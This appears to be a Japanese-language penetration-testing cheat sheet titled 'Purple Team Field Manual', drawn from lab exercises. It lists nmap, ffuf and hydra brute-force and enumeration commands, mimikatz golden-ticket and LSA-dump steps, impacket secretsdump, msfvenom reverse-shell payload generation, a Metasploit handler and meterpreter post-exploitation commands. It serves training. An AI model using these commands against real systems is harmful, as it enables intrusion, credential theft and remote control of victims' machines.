# PURPLE TEAM FIELD MANUAL

## LINUX のコマンド

### ネットワーク基本コマンド

+----------------------------------+----------------------------------+
| watch ss -tp | ネットワーク接続をウォッチ |
+----------------------------------+----------------------------------+
| ss -latu | ネットワーク接続を表示 |
+----------------------------------+----------------------------------+
| netstat -tnu | Tcp connections -anu=udp |
+----------------------------------+----------------------------------+
| netstat -tulpn | PID 付で Connections を表示 |
+----------------------------------+----------------------------------+
| lsof -i | Established connections |
+----------------------------------+----------------------------------+
| net rpc share list | SMB サーバの共有一覧を表示 |
+----------------------------------+----------------------------------+
| smbclient -U user | SMB 共有フォルダへアクセス |
| //x.x.x.x/share | |
+----------------------------------+----------------------------------+
| ifconfig eth x.x.x.x/xx | IP アドレスを設定する |
+----------------------------------+----------------------------------+
| ifconfig ethO:1 x.x.x.x/xx | 論理インターフェースに IP を設定 |
+----------------------------------+----------------------------------+
| ifconfig eth0 mtu \[size\] | MTU サイズの変更 |
+----------------------------------+----------------------------------+
| ip addr show | IP アドレスを表示 |
+----------------------------------+----------------------------------+
| ip addr add x.x.x.x/xx dev eth0 | IP アドレスを設定する |
+----------------------------------+----------------------------------+
| ip link show eth0 | eth0 の MAC アドレスを表示 |
+----------------------------------+----------------------------------+
| ip link set dev eth0 address | eth0 の MAC アド |
| x:x:x:x:x:x | レスを変更(eth0 を down にしてから) |
+----------------------------------+----------------------------------+
| macchanger -r eth0 | eth0 の MAC アドレスを変更 |
+----------------------------------+----------------------------------+
| macchanger -e eth0 | ベンダコードは |
| | 変えずに eth0 の MAC アドレスを変更 |
+----------------------------------+----------------------------------+
| ip route add default via x.x.x.x | eth0 |
| dev | デフォルトゲートウェイの設定 |
+----------------------------------+----------------------------------+
| route add default gw x.x.x.x | デフォルトゲートウェイの設定 |
+----------------------------------+----------------------------------+
| ip neighbor | arp |
+----------------------------------+----------------------------------+
| iw | iwconfig |
+----------------------------------+---------------------------------+
| iwlist \<interface\> scan | 無線 AP のリスト表示 |
+----------------------------------+----------------------------------+
| dig \<domaniname\> | 正引き名前解決 |
+----------------------------------+----------------------------------+
| dig -x ip | 逆引き名前解決 |
+----------------------------------+----------------------------------+
| dig \@x.x.x.x \<domainname\> -t | \@でサーバ指定、-t でタイプ指定 |
| AXFR | |
+----------------------------------+----------------------------------+
| nbtstat -A x.x.x.x | IP アドレスから NetBIOS 名を表示 |
+----------------------------------+----------------------------------+
| tcpkill host x.x.x.x and port | TCP 接続を切断 |
| x.x.x.x | |
+----------------------------------+----------------------------------+
| echo \"1\" | IP パケット転送を ON にする |
| /proc/sys/net/ipv4/ip_forward | |
+----------------------------------+----------------------------------+
| echo \"nameserver x.x.x.x\" \>\> | DNS サーバを追加する |
| /etc/resolv.conf | |
+----------------------------------+----------------------------------+

### システム情報確認コマンド

+--------------------------+-------------------------------------------------+
| id | | カレントユーザの情報表示 |
+--------------------------+-------------------------------------------------+
| whoami | | カレントユーザ名の表示 |
+--------------------------+-------------------------------------------------+
| w | | ログオンユーザの情報表示 |
+--------------------------+-------------------------------------------------+
| who -a | | ログオンユーザの情報表示 |
+--------------------------+-------------------------------------------------+
| last -a | | ユーザの最後のログオン情報を表示 |
+--------------------------+-------------------------------------------------+
| ps -ef | | プロセスリストの表示 |
+--------------------------+-------------------------------------------------+
| df -h | | ディスク使用状況の表示 |
+--------------------------+-------------------------------------------------+
| uname -a | | カーネルバージョン/CPU 情報など |
+--------------------------+-------------------------------------------------+
| mount | | マウントしているファイルシステム表示 |
+--------------------------+-------------------------------------------------+
| getent \<database\> | | \<database\>から情報の取得。passwd や hosts など |
+--------------------------+-------------------------------------------------+
| PATH=\$PATH:/home/mypath | | PATH 変数にパスを追加 |
+--------------------------+-------------------------------------------------+
| kill pid | | PID で指定するプロセスを Kill |
+--------------------------+-------------------------------------------------+
| cat /etc/issue | | OS 情報の表示 |
+--------------------------+-------------------------------------------------+
| cat /etc/\*release | | OS バージョン(詳細）の表示 |
+--------------------------+-------------------------------------------------+
| cat /proc/version | | カーネル情報の表示 |
+--------------------------+-------------------------------------------------+
| rpm -qa | | インストール済み RPM パッケージ表示 (Redhat) |
+--------------------------+-------------------------------------------------+
| rpm -ivh rpm_file | | RPM ファイルのインストール (-e=削除) |
+--------------------------+-------------------------------------------------+
| dpkg -get-selections | | インストール済み DPKG 表示 (Ubuntu) |
+--------------------------+-------------------------------------------------+
| dpkg -I deb_file | | DPKG ファイルのインストール I (-r=削除) |
+--------------------------+-------------------------------------------------+

### ユーティリティコマンド

+----------------------------------+----------------------------------+
| wget <http://>\<URL\> -0 url.txt | | URL からファイルを取得 |
| -o /dev/null | |
+----------------------------------+----------------------------------+
| rdesktop x.x.x.x | | リモートデスクトップ接続 |
+----------------------------------+----------------------------------+
| scp /tmp/file | | SCP でファイルを Put |
| <user@x.x.x.x>:/tmp/file | |
+----------------------------------+----------------------------------+
| scp <user@x.x.x.x>:/tmp/file | | SCP でファイルを Get |
| /tmp/file | |
+----------------------------------+----------------------------------+
| useradd -m \<user_name\> | | ユーザを追加 |
+----------------------------------+----------------------------------+
| userdel \<user_name\> | | ユーザを削除 |
+----------------------------------+----------------------------------+
| passwd \<user_name\> | | ユーザのパスワードを変更 |
+----------------------------------+----------------------------------+
| script -a outfile | | 操 |
| | 作ログを記録（Ctrl+D でストップ） |
+----------------------------------+----------------------------------+
| apropos \<subject\> | | \<s |
| | ubject\>に関連するコマンドを探す |
+----------------------------------+----------------------------------+
| history | | コマンド履歴を表示 |
+----------------------------------+----------------------------------+
| !num | | |
| | history の num 行目のコマンドを実行 |
+----------------------------------+----------------------------------+

## WINDOWS の基本コマンド

### Powerview

```powershell
PowerView.ps1
Get-NetUser | select cn
Get-NetGroup -GroupName *admin*
```

[チートシート](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

## NETWORKING

### 仮ヘッダ 2

#### Ping

```
ping x.x.x.x
```

## TIPS AND TRICKS

### 仮ヘッダ

#### nfs マウント

```bash
mkdir /mnt/mountpoint
mount x.x.x.x:/directory /mnt/mountpoint
```

## TOOL SYNTAX

### 仮ヘッダ

#### nmap

##### 基本

```bash
mkdir nmap
nmap -vv -sC -sV -oN nmap/initial x.x.x.x
```

##### 基本オプション

|オプション     |説明     |
| --- | --- |
| -v    | 詳細情報を出力   |
| -n    | DNSによる名前解決をしない    |
| -iL _filename_   | ホスト/ネットワークのリストから入力   |
| -sL    | スキャンするターゲットをリストする    |
| -Pn    | Pingスキャン行わない。    |
| -sn    | Pingスキャンする。ポートスキャンは行わない    |
| -PR    | ARPスキャンする。   |
| -PE/PP/PM | ICMP Echo/time stamp/mask queryスキャンする。   |
| -sV    | サービス/バージョン情報を検出する    |
| -A    | OS検出とバージョン検出を有効にする    |
| -sS/sT    | TCP SYNスキャン/接続スキャン    |
| -sU    | UDPスキャン    |
| -sN/sF/sX    | nullスキャン/Finスキャン/Xmasスキャン    |
| -F    | スキャン対象ポートを100(デフォルトは1000)にして高速化する    |
| -p[PORT]    | スキャンするポートを指定。-p- はフルポート指定    |
| -T\<0-5\>    | タイミング テンプレートの設定 (大きいほど高速)     |
| -sU    | UDPスキャン    |
| --reason    | スキャンの結果(OpenやCloseなど)を結論付けた理由を出力    |
| -sC    | --scritp=defaultと同じ    |
| -oN _filename_   | スキャン結果をノーマル形式で filename に出力  |

##### 使用例

基本形（よく使うオプション)

```bash
nmap -n -T4 -sS -sV -sC -oN nmap/portscan -p- x.x.x.x
nmap -sC -sV -T4 -A x.x.x.x -oA nmap.nmap
```

ホストディスカバリで使うオプション

```bash
nmap -PE -sn x.x.x.x           # ICMP エコー(ICMPタイプ8)を使用
nmap -PP -sn x.x.x.x           # ICMP タイムスタンプ要求(ICMPタイプ13)を使用
nmap -PM -sn x.x.x.x           # ICMP マスク要求(ICMPタイプ17)を使用
nmap -PS[PORTLIST] -sn x.x.x.x # TCP SYNを使用(ポート指定がない場合は80を使用)
nmap -PA[PORTLIST] -sn x.x.x.x # TCP ACKを使用(ポート指定がない場合は80を使用)
nmap -PU[PORTLIST] -sn x.x.x.x # UDPを使用
```

ポートスキャンで使うオプション

```bash
nmap -sT x.x.x.x                     # TCP接続スキャン
nmap -sS x.x.x.x                     # TCP SYNスキャン
nmap -sU x.x.x.x                     # UDPスキャン
nmap -p80-500 --max-rate 50 xxx.xxx.xx.xxx # 80～500まで、レート<=50パケット/秒でスキャン
```

送信元詐称で使うオプション

```bash
nmap -e [interface] -Pn -S x.x.x.x y.y.y.y # 送信元Ipをx.x.x.xにしてスキャンする
nmap -e [interface] -Pn -D x.x.x.x,y.y.y.y z.z.z.z # 送信元Ipをx.x.x.xにしてスキャンする
```

SMB 共有のマシンを列挙

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse x.x.x.x
```

rpcbind（ポート 111）がオープンしている場合

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount x.x.x.x
```

#### smbclient

##### 基本

```bash
smbclient //x.x.x.x/directory_name
smbget -R smb://x.x.x.x/directory_name
```

##### オプション

+----------------------------+------------------------------------------+
| -L \<HOST\> | | HOST で共有されているフォルダ一覧を表示 |
+----------------------------+------------------------------------------+
| -U \<username\[%password\] | | ユーザ名とパスワードを指定 |
+----------------------------+------------------------------------------+

##### 使用例

###### リモートサーバ(10.10.80.79)で共有されているフォルダを表示

```bash
smbclient -L 10.10.80.79 -U svc-admin%management2005
```

###### リモートサーバ(10.10.80.79)の共有フォルダ(backup)へ接続

```bash
smbclient -U svc-admin%management2005 //10.10.80.79/backup
```

#### gobuster

高速ディレクトリ検出ツール

##### 基本

###### gobuster のダウンロード

```bash
sudo apt install gobuster
```

###### gobuster の実行

```bash
gobuster dir -u http://x.x.x.x -w /usr/share/wordlists/dirbuster//directory-list-2.3-medium.txt
```

##### オプション

+--------------------+--------------------------------------------+
| -e | | コンソールに完全な URL を出力する |
+--------------------+--------------------------------------------+
| -u | | ターゲット URL |
+--------------------+--------------------------------------------+
| -w | | 単語リストへのパス |
+--------------------+--------------------------------------------+
| -Uor-P | | 基本認証のユーザ名とパスワード |
+--------------------+--------------------------------------------+
| -p \<x\> | | リクエストに使用するプロキシ |
+--------------------+--------------------------------------------+
| -c \<http cookie\> | | 認証をシミュレートするための Cookie を指定 |
+--------------------+--------------------------------------------+

#### ffuf

##### 基本

```bash
ffuf -w <wordlist> -u http://x.x.x.x
```

##### オプション

+-----+---------------------------------------------------------------+
| -w | | |
| | ワードリストを指定。2 つ指定する場合は、ファイル名の最期に:W1 |
| | :W2 を付ける。 |
| | | -d オプションの中で指定した W1,W2 の場所に挿入される。 |
+-----+---------------------------------------------------------------+
| -X | | デフォルトでは GET になるが、POST などを指定できる。 |
+-----+---------------------------------------------------------------+
| -d | | 送信するデータを指定。 |
| | | FUZZ キ |
| | ーワードを指定した場所に単語リストのコンテンツが挿入される。 |
+-----+---------------------------------------------------------------+
| -H | | 追加のヘッダーをリクエストに追加する。 |
+-----+---------------------------------------------------------------+
| -u | | リクエスト先の URL を指定する。 |
+-----+---------------------------------------------------------------+
| -mr | | 有効なユーザ名が |
| | 見つかったことを検証するために探しているページ上のテキスト。 |
+-----+---------------------------------------------------------------+
| -fs | | サイズを指定。 |
+-----+---------------------------------------------------------------+
| -fc | | コードを指定。 |
+-----+---------------------------------------------------------------+

##### 使用例

###### バーチャルホストを探す（バーチャルホスト:同じ IP で複数の FQDN をホストするための機能）

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host:FUZZ.acmeitsupport.thm" -u http://10.10.57.176 -fs {size}
```

###### ユーザ名を列挙

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.27.194/customers/signup -mr "username already exists"
```

###### 有効なユーザ名とパスワードの組み合わせを見つける

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.27.194/customers/login -fc 200
```

#### enum4linux

smb が動作しているサーバのユーザをブルートフォースで列挙する

##### 基本

```bash
enum4linux -a x.x.x.x | tee enum4linux.log
```

#### kerbrute

| Kerberos Pre-Authentication を介して有効な Active
Directory アカウントを迅速にブルートフォースし、列挙するためのツール
| <https://github.com/ropnop/kerbrutew>

##### 基本

```bash
kerbrute [command]
kerbrute [command] --help   #サブコマンドのヘルプ表示
```

##### サブコマンド

+---------------+-----------------------------------------------------+
| bruteuser | | 単語リス |
| | トから単一ユーザのパスワードをブルートフォースする |
+---------------+-----------------------------------------------------+
| bruteforce | | ファイルまたは標準入力 |
| | からユーザ名:パスワードの組合せを読み取りテストする |
+---------------+-----------------------------------------------------+
| passwordspray | | |
| | ユーザのリストに対して単一のパスワードをテストする |
+---------------+-----------------------------------------------------+
| userenum | | Kerberos を介して有効なドメインユーザ名を列挙する |
+---------------+-----------------------------------------------------+

##### オプション

+---------+-----------------------------------------------------------+
| -d | | フルドメインを指定 |
+---------+-----------------------------------------------------------+
| -dc | | ドメインコントローラを指定 |
+---------+-----------------------------------------------------------+
| -t | | スレッド数を指定（デフォルトは 10） |
+---------+-----------------------------------------------------------+
| -o | | ログファイルを指定（デフォルトは標準出力に記録） |
+---------+-----------------------------------------------------------+
| \--safe | | セーフモード。ア |
| | カウントがロックアウトされた場合、すべてのスレッドを中止 |
+---------+-----------------------------------------------------------+

##### 使用例

###### 有効なユーザ名を列挙する

```bash
./kerbrute  userenum -d spookysec.local --dc 10.10.111.162 userlist.txt
```

#### mimikatz

##### mimikatz 基本

##### mimikatzサブコマンド

##### mimikatz使用例

```cmd
mimikatz.exe
mimikatz # 
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:[SID] /krbtgt:[NTLM] /id:[ID]
mimikatz # misc::cmd
```

```cmd
mimikatz.exe
mimikatz # 
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
```

#### Impacket

| ネットワーク プロトコルを操作するための Python クラスのコレクション
| <https://github.com/SecureAuthCorp/impacket>

##### 基本

```bash
impacket    #impacketがインストールされたディレクトリに移動
```

##### ツールコレクション

+----------------+----------------------------------------------------+
| GetNPUsers.py | | キー配布センターから ASReproastable |
| | アカウントにクエリを実行 |
+----------------+----------------------------------------------------+
| secretsdump.py | | ユーザア |
| | カウントが提供するすべてのパスワードハッシュを取得 |
+----------------+----------------------------------------------------+

##### 使用例

###### パスワードなしでチケットを照会できるか確認する

```bash
python3.9 /opt/impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.80.79 thm-ad/svc-admin
python3.9 /opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.10.80.79
```

#### hydra

| ブルートフォース型のオンラインパスワードクラッキングプログラム
| <https://en.kali.tools/?p=220>

##### 基本

```bash
hydra -l <username> -P <passwordlist> x.x.x.x <protocol>
hydra -l <username> -P <passwordlist> protocol://x.x.x.x 
```

##### オプション
| オプション | 説明  |
| --- | --- |
|-U module_name | モジュール名の詳細ヘルプを表示。http-get-formやhttp-post-formなど  |
| -l username | ユーザ名を指定    |
| -P FILE    | パスワードリストファイルを指定    |
| -s PORT    | デフォルトポート以外のポートを指定    |
| -V / -vV    | 詳細を表示     |
| -t n    | nはターゲットへの並列接続する     |
| -d    | デバック用の詳細出力     |
| http-post-form  | プロトコルをHTTP POSTと指定    |
| ^USER^    | ユーザ名が代入される箇所    |
| ^PASS^    | パスワードが代入される個所    |
| F=_message_    | ログイン失敗時のメッセージ   |

##### 使用例

```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://x.x.x.x
hydra -l <username> -P /usr/share/wordlists/rockyou.txt x.x.x.x ftp
hydra -V -l molly -P /usr/share/wordlists/rockyou.txt 10.10.246.23 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
```
#### john

パスワードハッシュからパスワードを割り出す

##### 基本

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt filename
```

##### オプション

##### 使用例

###### ssh の秘密鍵を john で扱える形式に変換

```bash
ssh2john.py id_rsa > john_id_rsa
john --wordlist=/usr/share/wordlists/rockyou.txt john_id_rsa
```

#### certutil

Windows システム上から HTTP サーバ上のファイルをダウンロードするときに使用

##### 基本

```bash
certutil -urlcache -f http://10.10.118.108:8080/winPEAS.exe winPEAS.exe
```

##### オプション

##### 使用例

Powershell でもできる（Invoke-WebRequest は wget
にエイリアス設定されているので wget も使える）

```
powershell -c "Invoke-WebRequest -Uri 対象URI -OutFile 保存するローカルパス"
powershell -c "wget -Uri http://10.10.118.108:8080/ASCService.exe -OutFile ASCService.exe"
```

#### curl

##### 基本

##### オプション

##### 使用例

```bash
curl -X POST http://x.x.x.x/path/to_file.php -d 'method=POST&file=../../../etc/passwd' --output -
```

#### searchsploit

exploit-db.com のコマンド ライン検索ツール

##### 基本

```bash
searchsploit software_name version
```

### metasploit コマンド関連

#### metasploit

##### 主なコンポーネント

+---------------+-----------------------------------------------------+
| Exploit | | ターゲ |
| | ットシステムに存在する脆弱性を使用するコードの一部 |
+---------------+-----------------------------------------------------+
| Vulnerability | | ターゲット |
| | システムに影響 |
| | を与える設計、コーディング、またはロジックの欠陥。 |
| | | 脆弱性が悪用されると |
| | 、機密情報が漏えいしたり、攻撃者が標的のシステムで |
| | | コードを実行できるようになる可能性があります。 |
+---------------+-----------------------------------------------------+
| Payload | | エクスプロイトは脆弱 |
| | 性を利用します。ただし、エクスプロイトで目的の結果 |
| | | (ターゲット |
| | システムへのアクセスの取得、機密情報の読み取りなど) |
| | を |
| | | |
| | 得たい場合は、ペイロードを使用する必要があります。 |
| | | ペイロ |
| | ードは、ターゲットシステムで実行されるコードです。 |
+---------------+-----------------------------------------------------+
| Auxiliary | | スキャナー、クローラー、ファザーなどのサポート |
| | モジュール |
+---------------+-----------------------------------------------------+
| Encoders | | エンコーダーを使 |
| | 用すると、署名ベースのウイルス対策ソリューションが |
| | | それらを見逃す可能性 |
| | があることを期待して、エクスプロイトとペイロードを |
| | | エンコードできます。 |
+---------------+-----------------------------------------------------+
| Evasion | | エンコーダーはペイロー |
| | ドをエンコードしますが、ウイルス対策ソフトウェアを |
| | | 回避 |
| | するための直接的な試みと見なすべきではありません。 |
+---------------+-----------------------------------------------------+

##### 基本(起動)

```bash
msfconsole
```

##### サブコマンド（msf5\>）

```bash
msf> help
ls
history
ping
help [sub command]
search keyword   # 例）search type:auxiliary telnet
use
info モジュール名
show options
show payloads
set パラメータ 値
unset all
setg    # 異なるモジュール間でデフォルトの値として使用できる
unsetg
back
exploit [-z]  # -z付で実行するとセッションが開くとすぐにバックグラウンドで実行する
run
background(or Ctrl+z)
sessions
sessions -i x  # xはセッションナンバー
```

##### 使用例（スキャニング）

###### 基本

```bash
msf5> search portscan
msf5> use x
msf5> show options
# CONCURRENCY  : 同時にスキャンするターゲットの数。
# PORTS   : スキャンするポート範囲。ここでの 1 ～ 1000 は、デフォルト設定で Nmap を使用する場合と同じではないことに注意してください。Nmap は最も使用されている 1000 個のポートをスキャンしますが、Metasploit は 1 から 10000 までのポート番号をスキャンします。
# RHOSTS   : スキャンするターゲットまたはターゲット ネットワーク。
# THREADS   : 同時に使用されるスレッドの数。スレッドが多いほど、スキャンが高速になります

msf5> nmap -sS x.x.x.x : msfconsoleからnmapを実行できる
```

###### UDP サービス識別

```bash
msf5> use scanner/discovery/udp_sweep
```

###### SMB スキャン

```bash
msf5> use scanner/smb/smb_version
```

##### 使用例（Metasploit データベースを使用する方法）

```bash
systemctl start postgresql   # postgresqlを起動しておく mysqlでもよい
msfdb init                   # Metasploitデータベース初期化
msfconsole
msf5> db_status              # データベースの状態確認
msf5> workspace              # ワークスペースの確認
msf5> workspace -a tryhackme #ワークスペース(tryhackme)の追加
msf5> workspace -h           # 利用できるオプションの確認
msf5> db_nmap -sV -p- x.x.x.x  # nmapスキャンを実行し結果をデータベースに保存する
msf5> hosts [-h]
msf5> services [-h]
```

##### 使用例（エクスプロイトの実行手順）

```bash
msf5> search keyword
msf5> use [0-9]
msf5> show options
msf5> show payloads
msf5> set payload x              # デフォルト以外のpayloadを使用するとき
msf5> set RHOSTS x.x.x.x
msf5> set RPORT xxxx
msf5> set LHOST x.x.x.x   # リバースペイロードを使用するとき
msf5> set LPORT xxxx
msf5> exploitp    # exploit成功後、バックグラウンド実行にするにはCtrl+Z、中止するにはCtrl+C
msf5> sessions [-h]
msf5> sessions -i x
```

##### 使用例（マルチハンドラーで待受けする手順）

    Metasploitの multi/handlerモジュールを使用しリバースシェルをキャッチする
    Meterpreterシェルを使用する場合に不可欠で、ステージングされたペイロードを使用する場合に使う

```bash
msf5> use multi/handler
msf5> set payload php/reverse_php
msf5> set lhost x.x.x.x
msf5> set lport xxxx
msf5> expllit -j   # -jオプションで、Metasploit はモジュールを起動し、バックグラウンドでジョブとして実行
```

#### msfvenom

payload の作成に使用するツール

##### 基本

##### オプション

+----+-----------------------------------------------+
| -l | | 作成可能なペイロード一覧を表示 |
+----+-----------------------------------------------+
| -p | | 作成するペイロードを指定 |
+----+-----------------------------------------------+
| -f | | 作成するフォーマットを指定。exe,raw,elf など |
+----+-----------------------------------------------+
| -e | | エンコードを指定 |
+----+-----------------------------------------------+
| -o | | 出力するファイル名を指定 |
+----+-----------------------------------------------+

##### 使用例

```bash
msfvenom -l payloads|encoders
msfvenom --list formats         # サポートされている出力形式を一覧表示
msfvenom -p php/reverse_php LHOST=x.x.x.x LPORT=xxxx -f raw > reverse_shell.php
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

##### リバースシェルの種類

ステージングされたペイロードとステージレスペイロードがある

###### ステージングされたペイロード

2 つの部分に分けて送信される。最初の部分はステージャと呼ばれサーバ自体で直接実行されるコード。
待機中のリスナーに接続し直すが、それ自体にリバースシェルコードは含まれていない。
リスナーに接続し、その接続を使用して実際のペイロードをロードし、それを実行してウイルス対策ソフトを回避する。
ステージングされたペイロードには、特別なリスナー(通常は、Metasploit の multi/handller)が必要。

###### ステージレスペイロード

完全に自己完結型。実行するとすぐに待機中のリスナーにシェルを送り返す。

##### ペイロードの命名規則

###### ステージングされたペイロード

| \<OS\>/\<arch\>/\<software\>/\<payload\>
| 例) windows/x64/meterpreter/reverse_tcp

###### ステージングレスペイロード

| \<OS\>/\<arch\>/\<software\>\_\<payload\>
| 例) linux/x86/meterpreter_reverse_tcp
| ※OS が Windows32 ビットの場合、\<arch\>の部分の指定は無し

#### meterpreter

##### 基本

大きく 3 つを提供する \* 組み込みコマンド \* Meterpreter ツール \*
Meterpreter スクリプト help コマンドを実行すると、Meterpreter
コマンドがさまざまなカテゴリにリストされていることがわかる。

##### サブコマンドの種類

- コア コマンド
- ファイル システム コマンド
- ネットワーク コマンド
- システム コマンド
- ユーザー インターフェイス コマンド
- Web カメラ コマンド
- オーディオ出力コマンド
- 昇格コマンド
- パスワード データベース コマンド
- タイムスタンプ コマンド

##### コアコマンド

+------------+--------------------------------------------------------------+
| background | | 現在のセッションをバックグラウンドにします |
+------------+--------------------------------------------------------------+
| exit | | Meterpreter セッションを終了します |
+------------+--------------------------------------------------------------+
| guid | | セッション GUID (Globally Unique Identifier) を取得します |
+------------+--------------------------------------------------------------+
| help | | ヘルプメニューを表示 |
+------------+--------------------------------------------------------------+
| info | | Post モジュールに関する情報を表示します |
+------------+--------------------------------------------------------------+
| irb | | 現在のセッションでインタラクティブな Ruby シェルを開きます |
+------------+--------------------------------------------------------------+
| load | | 1 つ以上の Meterpreter 拡張機能をロードします |
+------------+--------------------------------------------------------------+
| migrate | | Meterpreter を別のプロセスに移行できます |
+------------+--------------------------------------------------------------+
| run | | Meterpreter スクリプトまたは Post モジュールを実行します |
+------------+--------------------------------------------------------------+
| sessions | | 別のセッションにすばやく切り替える |
+------------+--------------------------------------------------------------+

##### ファイル システム コマンド

+----------+----------------------------------------------------------+
| cd | | ディレクトリを変更します |
+----------+----------------------------------------------------------+
| ls | | 現在のディレクトリ内のファイルを一覧表示します (dir |
| | も機能します) |
+----------+----------------------------------------------------------+
| pwd | | 現在の作業ディレクトリを出力します |
+----------+----------------------------------------------------------+
| edit | | ファイルを編集できるようにします |
+----------+----------------------------------------------------------+
| cat | | ファイルの内容を画面に表示します |
+----------+----------------------------------------------------------+
| rm | | 指定したファイルを削除します |
+----------+----------------------------------------------------------+
| search | | ファイルを検索します |
+----------+----------------------------------------------------------+
| upload | | ファイルまたはディレクトリをアップロードします |
+----------+----------------------------------------------------------+
| download | | ファイルまたはディレクトリをダウンロードします |
+----------+----------------------------------------------------------+

##### ネットワーク コマンド

+----------+----------------------------------------------------------+
| arp | | ホスト ARP (アドレス解決プロトコル) |
| | キャッシュを表示します。 |
+----------+----------------------------------------------------------+
| ifconfig | | ターゲット システムで使用可能なネットワーク |
| | インターフェイスを表示します。 |
+----------+----------------------------------------------------------+
| netstat | | ネットワーク接続を表示します |
+----------+----------------------------------------------------------+
| portfwd | | ローカル ポートをリモート サービスに転送します |
+----------+----------------------------------------------------------+
| route | | ルーティング テーブルを表示および変更できます。 |
+----------+----------------------------------------------------------+

##### システム コマンド

+----------+--------------------------------------------------------+
| clearev | | イベント ログをクリアします。 |
+----------+--------------------------------------------------------+
| execute | | コマンド実行 |
+----------+--------------------------------------------------------+
| getpid | | 現在のプロセス識別子を表示します |
+----------+--------------------------------------------------------+
| getuid | | Meterpreter が実行されているユーザーを示します |
+----------+--------------------------------------------------------+
| kill | | プロセスを終了します |
+----------+--------------------------------------------------------+
| pkill | | プロセスを名前で終了します |
+----------+--------------------------------------------------------+
| ps | | 実行中のプロセスを一覧表示します |
+----------+--------------------------------------------------------+
| reboot | | リモート コンピューターを再起動します。 |
+----------+--------------------------------------------------------+
| shell | | システム コマンド シェルにドロップします。 |
+----------+--------------------------------------------------------+
| shutdown | | リモート コンピューターをシャットダウンします。 |
+----------+--------------------------------------------------------+
| sysinfo | | OS などのリモート システムに関する情報を取得します。 |
+----------+--------------------------------------------------------+

##### その他のコマンド

これらは、ヘルプ メニューのさまざまなメニュー カテゴリに一覧表示されます

+---------------+-----------------------------------------------------+
| idletime | | リモート |
| | ユーザーがアイドル状態だった秒数を返します |
+---------------+-----------------------------------------------------+
| keyscan_dump | | キーストローク バッファをダンプします。 |
+---------------+-----------------------------------------------------+
| keyscan_start | | キーストロークのキャプチャを開始します |
+---------------+-----------------------------------------------------+
| keyscan_stop | | キーストロークのキャプチャを停止します |
+---------------+-----------------------------------------------------+
| screenshare | | リモート |
| | ユーザー |
| | のデスクトップをリアルタイムで見ることができます。 |
+---------------+-----------------------------------------------------+
| screenshot | | インタラクティブ |
| | デスクトップのスクリーンショットを取得します |
+---------------+-----------------------------------------------------+
| record_mic | | デフォルトのマイクから音声を X 秒間録音します |
+---------------+-----------------------------------------------------+
| webcam_chat | | ビデオチャットを開始します |
+---------------+-----------------------------------------------------+
| webcam_list | | ウェブカメラを一覧表示します |
+---------------+-----------------------------------------------------+
| webcam_snap | | 指定した Web |
| | カメラからスナップショットを取得します |
+---------------+-----------------------------------------------------+
| webcam_stream | | 指定された Web カメラからのビデオ |
| | ストリームを再生します。 |
+---------------+-----------------------------------------------------+
| getsystem | | あなたの特権をローカル |
| | システムの特権に昇格させようとします。 |
+---------------+-----------------------------------------------------+
| hashdump | | SAM データベースの内容をダンプします。 |
+---------------+-----------------------------------------------------+

##### 使用例（Metasploit での Exploit 後）

```bash
# Windows
meterpreter > help
meterpreter > sysinfo
meterpreter > getuid
meterpreter > load powershell
meterpreter > powershell_shell
PS>
# Linux
meterpreter > ps
meterpreter > migrate PID
meterpreter > hashdump
meterpreter > search -f flag.txt
meterpreter > shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### evil-winrm

##### 基本

```bash
evil-winrm -i IP -u USER
```

##### オプション

+------------------+----------------------------+
| -i \<ip_addres\> | | リモート IP アドレスを指定 |
+------------------+----------------------------+
| -u \<username\> | | ユーザ名を指定 |
+------------------+----------------------------+
| -P \<password\> | | パスワードを指定 |
+------------------+----------------------------+
| -H \<HASH\> | | NTHash を指定 |
+------------------+----------------------------+

### OSINT 関連ツール

#### Google ハッキング/ドッキング

Filter Example Description site: site:tryhackme.com
指定された Web サイトアドレスからのみ結果を返す inurl: inurl:admin
URL に指定された単語を含む結果を返す filetype: filetype:pdf
特定のファイル拡張子である結果を返す intitle: intitle:admin
タイトルに指定された単語を含む結果を返す

#### Wappalyzer（https://www.wappalyzer.com/）

Web サイトで使用されているテクノロジーを特定するのに役立つオンラインツールおよびブラウザ拡張機能

#### Wayback Machine（https://archive.org/web/）

90 年代後半までさかのぼる Web サイトの歴史的アーカイブ

#### Wigle.net(<https://Wigle.net>)

世界中のさまざまなワイヤレスホットスポットに関する情報を収集するための Web サイト

### デジタルフォレンジック関連ツール

pdfinfo exiftool \| grep \'GPS Position\'
